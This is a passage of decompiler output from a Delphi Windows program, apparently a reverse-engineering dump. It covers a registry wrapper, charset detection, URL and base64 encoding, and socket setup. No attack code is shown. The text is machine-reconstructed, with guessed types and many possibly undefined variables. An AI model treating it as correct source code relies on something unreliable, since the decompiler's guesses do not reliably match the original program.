  sub_402F98(a1, v4, v5, v6);
  return result;
}
// 40E657: positive sp value 10 has been found
// 40E64F: variable 'v4' is possibly undefined
// 40E64F: variable 'v5' is possibly undefined
// 40E64F: variable 'v6' is possibly undefined
// 40E5B0: using guessed type int dword_40E5B0[5];
// 41DB70: using guessed type int **off_41DB70[32];

//----- (0040E658) --------------------------------------------------------
bool __usercall sub_40E658@<al>(_BYTE *a1@<eax>)
{
  return !a1 || *a1 != 92;
}

//----- (0040E66C) --------------------------------------------------------
int __usercall Registry::_16394@<eax>(char a1@<al>)
{
  char v1; // al
  char v2; // al
  char v3; // al

  v1 = a1 - 1;
  if ( !v1 )
    return 1;
  v2 = v1 - 1;
  if ( !v2 )
    return 2;
  v3 = v2 - 1;
  if ( !v3 )
    return 4;
  if ( v3 == 1 )
    return 3;
  return 0;
}

//----- (0040E69C) --------------------------------------------------------
char __usercall Registry::_16395@<al>(int a1@<eax>)
{
  switch ( a1 )
  {
    case 1:
      return 1;
    case 2:
      return 2;
    case 4:
      return 3;
    case 3:
      return 4;
  }
  return 0;
}

//----- (0040E6C4) --------------------------------------------------------
int __usercall Registry::TRegistry::TRegistry@<eax>(int a1@<eax>, char a2@<dl>)
{
  char v3; // bl
  int v4; // esi
  char v6; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = System::__linkproc__ ClassCreate(a1, a2, v6);
  v3 = a2;
  v4 = a1;
  Registry::TRegistry::SetRootKey(0x80000001, a1);
  *(_DWORD *)(v4 + 24) = 983103;
  *(_BYTE *)(v4 + 12) = 1;
  if ( v3 )
    sub_402D34((_DWORD *)v4);
  return v4;
}
// 40E6CD: variable 'v6' is possibly undefined
// 40E6D2: variable 'a2' is possibly undefined

//----- (0040E708) --------------------------------------------------------
void __usercall TStored_Destroy_7_1(int self@<eax>)
{
  char v1; // dl
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi

  v2 = sub_402D3C((_DWORD *)self, v1);
  v4 = v3;
  v5 = v2;
  Registry::TRegistry::CloseKey((int)v2);
  sub_402BCC(v5, v4 & 0xFC);
  if ( v4 > 0 )
    sub_402D2C(v5);
}
// 40E70A: variable 'v1' is possibly undefined
// 40E70F: variable 'v3' is possibly undefined

//----- (0040E734) --------------------------------------------------------
void __usercall Registry::TRegistry::CloseKey(int a1@<eax>)
{
  HKEY v3; // eax
  LStr *v4; // ecx

  v3 = *(HKEY *)(a1 + 4);
  if ( v3 )
  {
    if ( *(_BYTE *)(a1 + 12) )
      RegCloseKey_0(v3);
    else
      RegFlushKey(v3);
    *(_DWORD *)(a1 + 4) = 0;
    System::__linkproc__ LStrClr(v4);
  }
}
// 40E75A: variable 'v4' is possibly undefined

//----- (0040E764) --------------------------------------------------------
void __usercall Registry::TRegistry::SetRootKey(unsigned int a1@<edx>, int a2@<eax>)
{
  HKEY v5; // eax

  v5 = *(HKEY *)(a2 + 8);
  if ( (HKEY)a1 != v5 )
  {
    if ( *(_BYTE *)(a2 + 20) )
    {
      RegCloseKey_0(v5);
      *(_BYTE *)(a2 + 20) = 0;
    }
    *(_DWORD *)(a2 + 8) = a1;
    Registry::TRegistry::CloseKey(a2);
  }
}

//----- (0040E790) --------------------------------------------------------
void __usercall Registry::TRegistry::ChangeKey(Registry::TRegistry *this@<ecx>, unsigned int a2@<edx>, int a3@<eax>)
{
  Registry::TRegistry::CloseKey(a3);
  *(_DWORD *)(a3 + 4) = a2;
  __linkproc__ LStrAsg((char **)(a3 + 16), (char *)this);
}

//----- (0040E7B4) --------------------------------------------------------
int __usercall sub_40E7B4@<eax>(int a1@<eax>, char a2@<dl>)
{
  int result; // eax

  if ( *(_DWORD *)(a1 + 4) && a2 )
    result = *(_DWORD *)(a1 + 4);
  else
    result = *(_DWORD *)(a1 + 8);
  return result;
}

//----- (0040E7C8) --------------------------------------------------------
bool __usercall Registry::TRegistry::OpenKey@<al>(Registry::TRegistry *this@<ecx>, const int System::AnsiString@<edx>, int a3@<eax>)
{
  bool v4; // bl
  HKEY v5; // eax
  HKEY v6; // eax
  LStr *v7; // ecx
  char *v9; // [esp-2Ch] [ebp-44h]
  char *v10; // [esp-1Ch] [ebp-34h]
  REGSAM v11; // [esp-1Ch] [ebp-34h]
  REGSAM v12; // [esp-14h] [ebp-2Ch]
  unsigned int v13[2]; // [esp-Ch] [ebp-24h] BYREF
  LStr *v14; // [esp-4h] [ebp-1Ch]
  DWORD dwDisposition; // [esp+8h] [ebp-10h] BYREF
  char *v16; // [esp+Ch] [ebp-Ch] BYREF
  HKEY phkResult; // [esp+10h] [ebp-8h] BYREF
  bool v18; // [esp+16h] [ebp-2h]
  char v19; // [esp+17h] [ebp-1h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v16 = 0;
  v19 = (char)this;
  v14 = (LStr *)&savedregs;
  v13[1] = (unsigned int)&loc_40E8CD;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  __linkproc__ LStrLAsg(&v16, (char *)System::AnsiString);
  v4 = sub_40E658(v16);
  if ( !v4 )
    System::__linkproc__ LStrDelete(&v16, 1, 1);
  phkResult = 0;
  if ( v19 && v16 )
  {
    v11 = *(_DWORD *)(a3 + 24);
    v9 = sub_4038E8(v16);
    v6 = (HKEY)sub_40E7B4(a3, v4);
    v18 = RegCreateKeyExA(v6, v9, 0, 0, 0, v11, 0, &phkResult, &dwDisposition) == 0;
  }
  else
  {
    v12 = *(_DWORD *)(a3 + 24);
    v10 = sub_4038E8(v16);
    v5 = (HKEY)sub_40E7B4(a3, v4);
    v18 = RegOpenKeyExA_0(v5, v10, 0, v12, &phkResult) == 0;
  }
  if ( v18 )
  {
    if ( v4 && *(_DWORD *)(a3 + 4) != 0 )
      System::__linkproc__ LStrCatN(&v16, 3);
    Registry::TRegistry::ChangeKey((Registry::TRegistry *)v16, (unsigned int)phkResult, a3);
  }
  v7 = v14;
  __writefsdword(0, v13[0]);
  v14 = (LStr *)&loc_40E8D4;
  System::__linkproc__ LStrClr(v7);
  return v18;
}

//----- (0040E8EC) --------------------------------------------------------
int __usercall Registry::TRegistry::GetDataInfo@<eax>(int a1@<eax>, char *a2@<edx>, DWORD a3@<ecx>, int a4@<ebx>)
{
  char *v7; // eax
  DWORD Type[5]; // [esp+0h] [ebp-14h] BYREF

  Type[0] = a3;
  sub_4028D4((char *)a3, 8, 0);
  v7 = sub_4038E8(a2);
  LOBYTE(a4) = RegQueryValueExA_0(*(HKEY *)(a1 + 4), v7, 0, Type, 0, (LPDWORD)(a3 + 4)) == 0;
  *(_BYTE *)a3 = Registry::_16395(Type[0]);
  return a4;
}

//----- (0040E93C) --------------------------------------------------------
int __usercall Registry::TRegistry::GetDataSize@<eax>(const int System::AnsiString@<edx>, int a2@<eax>)
{
  int result; // eax
  _DWORD v4[4]; // [esp+0h] [ebp-10h] BYREF

  if ( (unsigned __int8)Registry::TRegistry::GetDataInfo(a2, (char *)System::AnsiString, (DWORD)v4, a2) )
    result = v4[1];
  else
    result = -1;
  return result;
}

//----- (0040E964) --------------------------------------------------------
void __usercall Registry::TRegistry::WriteString(int a1@<eax>, char *a2@<edx>, char *a3@<ecx>)
{
  char *v6; // eax
  DWORD v7; // [esp-4h] [ebp-10h]

  v7 = sub_403724((int)a3) + 1;
  v6 = sub_4038E8(a3);
  Registry::TRegistry::PutData(a1, a2, (const BYTE *)v6, 1, v7);
}

//----- (0040E990) --------------------------------------------------------
int __usercall Registry::TRegistry::ReadString@<eax>(Registry::TRegistry *this@<ecx>, const int System::AnsiString@<edx>, int a3@<eax>)
{
  LStr *v6; // ecx
  int v7; // ebx
  char *v8; // eax
  void *v9; // edx
  char *v10; // eax
  int v11; // eax
  LStr *v12; // ecx
  int result; // eax
  int v14[5]; // [esp+0h] [ebp-14h] BYREF

  v14[0] = (int)this;
  v7 = Registry::TRegistry::GetDataSize(System::AnsiString, a3);
  if ( v7 <= 0 )
  {
    System::__linkproc__ LStrClr(v6);
  }
  else
  {
    __linkproc__ LStrFromPCharLen((BYTE **)this, 0, v7);
    v8 = sub_4038E8(*(char **)this);
    Registry::TRegistry::GetData((int)v8, System::AnsiString, a3, (LPBYTE)v14, v7, v14[0]);
    if ( LOBYTE(v14[0]) == 1 || LOBYTE(v14[0]) == 2 )
    {
      v10 = sub_4038E8(*(char **)this);
      v11 = sub_407534(v10);
      System::__linkproc__ LStrSetLength((BYTE **)this, v11, v12);
    }
    else
    {
      result = sub_40E62C(System::AnsiString, v9);
    }
  }
  return result;
}
// 40E9E9: variable 'v12' is possibly undefined
// 40E9F2: variable 'v9' is possibly undefined
// 40E9FB: variable 'v6' is possibly undefined

//----- (0040EA08) --------------------------------------------------------
void __userpurge Registry::TRegistry::PutData(int a1@<eax>, char *a2@<edx>, const BYTE *a3@<ecx>, char a4, DWORD cbData)
{
  char *v7; // eax
  void *v8; // edx
  int v9; // [esp-Ch] [ebp-24h]
  DWORD v10; // [esp+0h] [ebp-18h]
  DWORD v11; // [esp+4h] [ebp-14h]
  DWORD v12; // [esp+8h] [ebp-10h]

  v9 = Registry::_16394(a4);
  v7 = sub_4038E8(a2);
  if ( RegSetValueExA(*(HKEY *)(a1 + 4), v7, 0, v9, a3, cbData) )
  {
    LOBYTE(v8) = 1;
    Sysutils::Exception::Exception(dword_40E5B0, v8, off_41DBB8[0]);
    sub_402F98(v10, v11, v12, (const ULONG_PTR *)a2);
  }
}
// 40EA5C: variable 'v8' is possibly undefined
// 40EA61: variable 'v10' is possibly undefined
// 40EA61: variable 'v11' is possibly undefined
// 40EA61: variable 'v12' is possibly undefined
// 40E5B0: using guessed type int dword_40E5B0[5];
// 41DBB8: using guessed type int **off_41DBB8[14];

//----- (0040EA70) --------------------------------------------------------
int __userpurge Registry::TRegistry::GetData@<eax>(int a1@<ecx>, int a2@<edx>, int a3@<eax>, LPBYTE lpData, int cbData, DWORD a6)
{
  char *v8; // eax
  void *v9; // edx
  int v10; // ebx
  DWORD v13; // [esp+0h] [ebp-18h]
  DWORD v14; // [esp+4h] [ebp-14h]
  DWORD v15; // [esp+8h] [ebp-10h]
  DWORD Type; // [esp+14h] [ebp-4h] BYREF

  Type = 0;
  v8 = sub_4038E8((char *)a2);
  if ( RegQueryValueExA_0(*(HKEY *)(a3 + 4), v8, 0, &Type, (LPBYTE)a1, (LPDWORD)&cbData) )
  {
    LOBYTE(v9) = 1;
    Sysutils::Exception::Exception(dword_40E5B0, v9, off_41DC90);
    sub_402F98(v13, v14, v15, (const ULONG_PTR *)a2);
  }
  v10 = cbData;
  *lpData = Registry::_16395(Type);
  return v10;
}
// 40EABE: variable 'v9' is possibly undefined
// 40EAC3: variable 'v13' is possibly undefined
// 40EAC3: variable 'v14' is possibly undefined
// 40EAC3: variable 'v15' is possibly undefined
// 40E5B0: using guessed type int dword_40E5B0[5];
// 41DC90: using guessed type int **off_41DC90;

//----- (0040EAE4) --------------------------------------------------------
int __usercall sub_40EAE4@<eax>(int a1@<eax>, char *a2@<edx>, int a3@<ebx>)
{
  int v4; // [esp+0h] [ebp-8h] BYREF

  return Registry::TRegistry::GetDataInfo(a1, a2, (DWORD)&v4, a3);
}

//----- (0040EB0C) --------------------------------------------------------
int Cxfilter::Finalization()
{
  int result; // eax
  unsigned int v2[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v2[2] = (unsigned int)&savedregs;
  v2[1] = (unsigned int)&loc_40EB48;
  v2[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v2);
  if ( !++dword_41E648 )
    System::__linkproc__ FinalizeArray((OLECHAR **)&off_41C2F8, (char *)dword_401004, 2);
  result = 0;
  __writefsdword(0, v2[0]);
  return result;
}
// 401004: using guessed type int dword_401004[2];
// 41C2F8: using guessed type int (*off_41C2F8)[4];
// 41E648: using guessed type int dword_41E648;

//----- (0040EB54) --------------------------------------------------------
void sub_40EB54()
{
  --dword_41E648;
}
// 41E648: using guessed type int dword_41E648;

//----- (0040EB64) --------------------------------------------------------
int Finalization_0_7_5()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40EB89;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E64C;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E64C: using guessed type int dword_41E64C;

//----- (0040EB94) --------------------------------------------------------
void sub_40EB94()
{
  --dword_41E64C;
}
// 41E64C: using guessed type int dword_41E64C;

//----- (0040EB9C) --------------------------------------------------------
_WORD *__userpurge sub_40EB9C@<eax>(_WORD *result@<eax>, _WORD *a2@<ecx>, int a3)
{
  int v3; // esi
  _WORD *v4; // edx

  v3 = 128;
  v4 = result;
  do
  {
    *a2++ = *v4++;
    --v3;
  }
  while ( v3 );
  return result;
}

//----- (0040EBC4) --------------------------------------------------------
_WORD *__usercall sub_40EBC4@<eax>(char a1@<al>, _WORD *a2@<edx>, int a3@<ecx>)
{
  _WORD *result; // eax

  result = (_WORD *)(a1 & 0x7F);
  switch ( (unsigned int)result )
  {
    case 0u:
      result = sub_40EB9C(word_41C300, a2, a3);
      break;
    case 1u:
      result = sub_40EB9C(word_41C400, a2, a3);
      break;
    case 2u:
      result = sub_40EB9C(word_41C500, a2, a3);
      break;
    case 3u:
      result = sub_40EB9C(word_41C600, a2, a3);
      break;
    case 4u:
      result = sub_40EB9C(word_41C700, a2, a3);
      break;
    case 5u:
      result = sub_40EB9C(word_41C800, a2, a3);
      break;
    case 6u:
      result = sub_40EB9C(word_41C900, a2, a3);
      break;
    case 7u:
      result = sub_40EB9C(word_41CA00, a2, a3);
      break;
    case 8u:
      result = sub_40EB9C(word_41CB00, a2, a3);
      break;
    case 9u:
      result = sub_40EB9C(word_41CC00, a2, a3);
      break;
    case 0xAu:
      result = sub_40EB9C(word_41CD00, a2, a3);
      break;
    case 0xBu:
      result = sub_40EB9C(word_41CE00, a2, a3);
      break;
    case 0xCu:
      result = sub_40EB9C(word_41CF00, a2, a3);
      break;
    case 0xDu:
      result = sub_40EB9C(word_41D000, a2, a3);
      break;
    case 0xEu:
      result = sub_40EB9C(word_41D100, a2, a3);
      break;
    case 0xFu:
      result = sub_40EB9C(word_41D200, a2, a3);
      break;
    case 0x10u:
      result = sub_40EB9C(word_41D300, a2, a3);
      break;
    case 0x11u:
      result = sub_40EB9C(word_41D400, a2, a3);
      break;
    case 0x12u:
      result = sub_40EB9C(word_41D500, a2, a3);
      break;
    case 0x13u:
      result = sub_40EB9C(word_41D600, a2, a3);
      break;
    default:
      return result;
  }
  return result;
}

//----- (0040EDA4) --------------------------------------------------------
void __userpurge sub_40EDA4(int a1@<eax>, char a2@<dl>, char a3@<cl>, BYTE **a4)
{
  LStr *v5; // ecx
  int v6; // eax
  unsigned __int8 v7; // bl
  int v8; // edx
  __int16 *v9; // eax
  LStr *v10; // ecx
  LStr *v11; // ecx
  unsigned int v12[2]; // [esp-Ch] [ebp-228h] BYREF
  LStr *v13; // [esp-4h] [ebp-220h]
  BYTE *v14; // [esp+8h] [ebp-214h] BYREF
  __int16 v15[128]; // [esp+Ch] [ebp-210h] BYREF
  __int16 v16[128]; // [esp+10Ch] [ebp-110h] BYREF
  int v17; // [esp+20Ch] [ebp-10h]
  int v18; // [esp+210h] [ebp-Ch]
  char v19; // [esp+217h] [ebp-5h]
  int v20; // [esp+218h] [ebp-4h]
  int savedregs; // [esp+21Ch] [ebp+0h] BYREF

  v14 = 0;
  v19 = a3;
  v20 = a1;
  sub_4038D8(a1);
  v13 = (LStr *)&savedregs;
  v12[1] = (unsigned int)&loc_40EE9C;
  v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v12);
  sub_40EBC4(a2, v16, 127);
  sub_40EBC4(v19, v15, 127);
  System::__linkproc__ LStrClr(v5);
  v6 = sub_403724(v20);
  if ( v6 > 0 )
  {
    v17 = v6;
    v18 = 1;
    do
    {
      v7 = *(_BYTE *)(v20 + v18 - 1);
      if ( v7 > 0x80u )
      {
        v8 = 128;
        v9 = v15;
        do
        {
          if ( v15[v7] == *v9 )
            break;
          ++v8;
          ++v9;
        }
        while ( v8 != 256 );
      }
      sub_403670(&v14);
      System::__linkproc__ LStrCat(a4, (char *)v14);
      ++v18;
      --v17;
    }
    while ( v17 );
  }
  v10 = v13;
  __writefsdword(0, v12[0]);
  v13 = (LStr *)&loc_40EEA3;
  System::__linkproc__ LStrClr(v10);
  System::__linkproc__ LStrClr(v11);
}
// 40EDFD: variable 'v5' is possibly undefined
// 40EE96: variable 'v11' is possibly undefined

//----- (0040EEAC) --------------------------------------------------------
int sub_40EEAC()
{
  UINT v0; // eax
  int v1; // edx

  v0 = GetACP();
  LOBYTE(v1) = 12;
  if ( v0 == 1250 )
    LOBYTE(v1) = 10;
  if ( v0 == 1251 )
    LOBYTE(v1) = 11;
  if ( v0 == 1253 )
    LOBYTE(v1) = 13;
  if ( v0 == 1254 )
    LOBYTE(v1) = 14;
  if ( v0 == 1255 )
    LOBYTE(v1) = 15;
  if ( v0 == 1256 )
    LOBYTE(v1) = 16;
  if ( v0 == 1257 )
    LOBYTE(v1) = 17;
  if ( v0 == 1258 )
    LOBYTE(v1) = 18;
  return v1;
}
// 40EEFB: variable 'v1' is possibly undefined

//----- (0040EF00) --------------------------------------------------------
void __usercall sub_40EF00(char a1@<al>, char **a2@<edx>)
{
  switch ( a1 & 0x7F )
  {
    case 1:
      __linkproc__ LStrAsg(a2, "ISO-8859-2");
      break;
    case 2:
      __linkproc__ LStrAsg(a2, "ISO-8859-3");
      break;
    case 3:
      __linkproc__ LStrAsg(a2, "ISO-8859-4");
      break;
    case 4:
      __linkproc__ LStrAsg(a2, "ISO-8859-5");
      break;
    case 5:
      __linkproc__ LStrAsg(a2, "ISO-8859-6");
      break;
    case 6:
      __linkproc__ LStrAsg(a2, "ISO-8859-7");
      break;
    case 7:
      __linkproc__ LStrAsg(a2, "ISO-8859-8");
      break;
    case 8:
      __linkproc__ LStrAsg(a2, "ISO-8859-9");
      break;
    case 9:
      __linkproc__ LStrAsg(a2, "ISO-8859-10");
      break;
    case 0xA:
      __linkproc__ LStrAsg(a2, "WINDOWS-1250");
      break;
    case 0xB:
      __linkproc__ LStrAsg(a2, "WINDOWS-1251");
      break;
    case 0xC:
      __linkproc__ LStrAsg(a2, "WINDOWS-1252");
      break;
    case 0xD:
      __linkproc__ LStrAsg(a2, "WINDOWS-1253");
      break;
    case 0xE:
      __linkproc__ LStrAsg(a2, "WINDOWS-1254");
      break;
    case 0xF:
      __linkproc__ LStrAsg(a2, "WINDOWS-1255");
      break;
    case 0x10:
      __linkproc__ LStrAsg(a2, "WINDOWS-1256");
      break;
    case 0x11:
      __linkproc__ LStrAsg(a2, "WINDOWS-1257");
      break;
    case 0x12:
      __linkproc__ LStrAsg(a2, "WINDOWS-1258");
      break;
    case 0x13:
      __linkproc__ LStrAsg(a2, "KOI8-R");
      break;
    default:
      __linkproc__ LStrAsg(a2, "ISO-8859-1");
      break;
  }
}

//----- (0040F230) --------------------------------------------------------
char __usercall sub_40F230@<al>(int a1@<eax>, char a2@<dl>, signed __int32 a3@<ecx>)
{
  LStr *v3; // ecx
  int v4; // ebx
  int v5; // esi
  int i; // esi
  bool v7; // cf
  int v8; // edi
  int v9; // ebx
  int v10; // eax
  LStr *v11; // ecx
  LStr *v12; // ecx
  unsigned int v14[2]; // [esp-Ch] [ebp-34h] BYREF
  LStr *v15; // [esp-4h] [ebp-2Ch]
  BYTE *v16; // [esp+Ch] [ebp-1Ch] BYREF
  BYTE *v17; // [esp+10h] [ebp-18h] BYREF
  BYTE *v18; // [esp+14h] [ebp-14h] BYREF
  int v19; // [esp+18h] [ebp-10h]
  char v20; // [esp+1Eh] [ebp-Ah]
  signed __int32 v21; // [esp+1Fh] [ebp-9h] BYREF
  char v22; // [esp+23h] [ebp-5h]
  int v23; // [esp+24h] [ebp-4h]
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v16 = 0;
  v18 = 0;
  v17 = 0;
  v21 = a3;
  v22 = a2;
  v23 = a1;
  sub_4038D8(a1);
  v15 = (LStr *)&savedregs;
  v14[1] = (unsigned int)&loc_40F334;
  v14[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  v20 = 0;
  System::__linkproc__ LStrClr(v3);
  v4 = sub_403724(v23);
  if ( v4 > 0 )
  {
    v5 = 1;
    do
    {
      if ( *(_BYTE *)(v23 + v5 - 1) > 0x7Fu )
      {
        sub_403670(&v16);
        System::__linkproc__ LStrCat(&v18, (char *)v16);
      }
      ++v5;
      --v4;
    }
    while ( v4 );
  }
  v19 = 128;
  for ( i = 0; i != 20; ++i )
  {
    v7 = (unsigned __int8)i < 0x1Fu;
    if ( (unsigned __int8)i <= 0x1Fu )
      v7 = _bittest(&v21, i & 0x7F);
    if ( v7 )
    {
      sub_40EDA4((int)v18, v22, i, &v17);
      v8 = 0;
      v9 = sub_403724((int)v17);
      if ( v9 > 0 )
      {
        v10 = 1;
        do
        {
          if ( v17[v10 - 1] == 95 )
            ++v8;
          ++v10;
          --v9;
        }
        while ( v9 );
      }
      if ( v8 < v19 )
      {
        v19 = v8;
        v20 = i;
        if ( !v8 )
          break;
      }
    }
  }
  v11 = v15;
  __writefsdword(0, v14[0]);
  v15 = (LStr *)&loc_40F33B;
  System::__linkproc__ LStrArrayClr(v11, 3);
  System::__linkproc__ LStrClr(v12);
  return v20;
}
// 40F26A: variable 'v3' is possibly undefined
// 40F32E: variable 'v12' is possibly undefined

//----- (0040F348) --------------------------------------------------------
int Finalization_0_7_6()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40F36D;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E650;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E650: using guessed type int dword_41E650;

//----- (0040F378) --------------------------------------------------------
void sub_40F378()
{
  --dword_41E650;
}
// 41E650: using guessed type int dword_41E650;

//----- (0040F3B4) --------------------------------------------------------
void __usercall sub_40F3B4(int a1@<eax>, BYTE **a2@<edx>)
{
  LStr *v3; // ecx
  int v4; // ebx
  int v5; // edi
  LStr *v6; // ecx
  LStr *v7; // ecx
  unsigned int v8[2]; // [esp-Ch] [ebp-44h] BYREF
  LStr *v9; // [esp-4h] [ebp-3Ch]
  char *v10; // [esp+Ch] [ebp-2Ch] BYREF
  signed __int32 v11[8]; // [esp+10h] [ebp-28h] BYREF
  BYTE *v12; // [esp+30h] [ebp-8h] BYREF
  int v13; // [esp+34h] [ebp-4h]
  int savedregs; // [esp+38h] [ebp+0h] BYREF

  v10 = 0;
  v12 = 0;
  v13 = a1;
  sub_4038D8(a1);
  v9 = (LStr *)&savedregs;
  v8[1] = (unsigned int)&loc_40F48F;
  v8[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v8);
  System::__linkproc__ LStrClr(v3);
  v4 = sub_403724(v13);
  if ( v4 > 0 )
  {
    v5 = 1;
    do
    {
      sub_403670(&v12);
      qmemcpy(v11, &unk_41D700, sizeof(v11));
      sub_402A44(v11, (char *)dword_40F4A0, 32);
      if ( _bittest(v11, *v12) )
      {
        Sysutils::IntToHex((int)&v10, 2, *v12);
        System::__linkproc__ LStrCat3(&v12, (BYTE *)&dword_40F4C8, v10);
      }
      System::__linkproc__ LStrCat(a2, (char *)v12);
      ++v5;
      --v4;
    }
    while ( v4 );
  }
  v6 = v9;
  __writefsdword(0, v8[0]);
  v9 = (LStr *)&loc_40F496;
  System::__linkproc__ LStrClr(v6);
  System::__linkproc__ LStrArrayClr(v7, 2);
}
// 40F3E2: variable 'v3' is possibly undefined
// 40F489: variable 'v7' is possibly undefined
// 40F4A0: using guessed type int dword_40F4A0[4];
// 40F4C8: using guessed type int dword_40F4C8;

//----- (0040F4CC) --------------------------------------------------------
void __usercall sub_40F4CC(int a1@<eax>, BYTE **a2@<edx>)
{
  LStr *v3; // ecx
  char v4; // al
  int v5; // eax
  char v6; // al
  int v7; // eax
  char v8; // al
  int v9; // esi
  char *v10; // ebx
  int v11; // eax
  LStr *v12; // ecx
  LStr *v13; // ecx
  unsigned int v14[2]; // [esp-Ch] [ebp-28h] BYREF
  LStr *v15; // [esp-4h] [ebp-20h]
  BYTE *v16; // [esp+Ch] [ebp-10h] BYREF
  char v17; // [esp+10h] [ebp-Ch] BYREF
  char v18; // [esp+11h] [ebp-Bh]
  char v19; // [esp+12h] [ebp-Ah]
  char v20; // [esp+13h] [ebp-9h]
  int v21; // [esp+14h] [ebp-8h]
  int v22; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v16 = 0;
  v22 = a1;
  sub_4038D8(a1);
  v15 = (LStr *)&savedregs;
  v14[1] = (unsigned int)&loc_40F5FA;
  v14[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  System::__linkproc__ LStrClr(v3);
  v21 = 1;
  while ( 1 )
  {
    v11 = sub_403724(v22);
    if ( v11 < v21 )
      break;
    v4 = *(_BYTE *)(v22 + v21++ - 1);
    v17 = (unsigned __int8)(v4 & 0xFC) >> 2;
    v18 = 16 * (v4 & 3);
    v5 = sub_403724(v22);
    if ( v5 < v21 )
    {
      v19 = 64;
      v20 = 64;
    }
    else
    {
      v6 = *(_BYTE *)(v22 + v21++ - 1);
      v18 += (unsigned __int8)(v6 & 0xF0) >> 4;
      v19 = 4 * (v6 & 0xF);
      v7 = sub_403724(v22);
      if ( v7 < v21 )
      {
        v20 = 64;
      }
      else
      {
        v8 = *(_BYTE *)(v22 + v21++ - 1);
        v19 += (unsigned __int8)(v8 & 0xC0) >> 6;
        v20 = v8 & 0x3F;
      }
    }
    v9 = 4;
    v10 = &v17;
    do
    {
      sub_403670(&v16);
      System::__linkproc__ LStrCat(a2, (char *)v16);
      ++v10;
      --v9;
    }
    while ( v9 );
  }
  v12 = v15;
  __writefsdword(0, v14[0]);
  v15 = (LStr *)&loc_40F601;
  System::__linkproc__ LStrClr(v12);
  System::__linkproc__ LStrClr(v13);
}
// 40F4F7: variable 'v3' is possibly undefined
// 40F5F4: variable 'v13' is possibly undefined

//----- (0040F654) --------------------------------------------------------
int Finalization_0_7_7()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40F679;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E654;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E654: using guessed type int dword_41E654;

//----- (0040F684) --------------------------------------------------------
void sub_40F684()
{
  --dword_41E654;
}
// 41E654: using guessed type int dword_41E654;

//----- (0040F6B4) --------------------------------------------------------
int __usercall sub_40F6B4@<eax>(int result@<eax>, int *a2@<edx>)
{
  if ( *a2 < 64 )
    a2[++*a2] = result;
  return result;
}

//----- (0040F6C4) --------------------------------------------------------
_DWORD *__usercall sub_40F6C4@<eax>(_DWORD *result@<eax>)
{
  *result = 0;
  return result;
}

//----- (0040F754) --------------------------------------------------------
int Finalization_0_7_8()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_40F779;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  ++dword_41E658;
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 41E658: using guessed type int dword_41E658;

//----- (0040F784) --------------------------------------------------------
void sub_40F784()
{
  --dword_41E658;
}
// 41E658: using guessed type int dword_41E658;

//----- (0040F908) --------------------------------------------------------
int __usercall sub_40F908@<eax>(void *a1@<eax>, char a2@<dl>)
{
  char v2; // bl
  int v3; // esi
  int v4; // eax
  int v5; // ecx
  char v7; // [esp-10h] [ebp-18h]

  if ( a2 )
    a1 = (void *)System::__linkproc__ ClassCreate((int)a1, a2, v7);
  v2 = a2;
  v3 = (int)a1;
  TObject_Create(a1);
  *(_BYTE *)(v3 + 52) = 0;
  *(_DWORD *)(v3 + 4) = -1;
  *(_DWORD *)(v3 + 44) = 0;
  v4 = WSAStartup(0x101u, (LPWSADATA)(v3 + 56));
  sub_40FF88(v3, v4);
  sub_40FF9C(v3, v5);
  if ( v2 )
    sub_402D34((_DWORD *)v3);
  return v3;
}
// 40F911: variable 'v7' is possibly undefined
// 40F916: variable 'a2' is possibly undefined
// 40F94C: variable 'v5' is possibly undefined

//----- (0040F96C) --------------------------------------------------------
void __usercall TStored_Destroy_7_2(int self@<eax>)
{
  char v1; // dl
  _DWORD *v2; // eax
  char v3; // dl
  char v4; // bl
  _DWORD *v5; // esi

  v2 = sub_402D3C((_DWORD *)self, v1);
  v4 = v3;
  v5 = v2;
  sub_40FAC8((int)v2);
  sub_402BCC(v5, v4 & 0xFC);
  if ( v4 > 0 )
    sub_402D2C(v5);
}
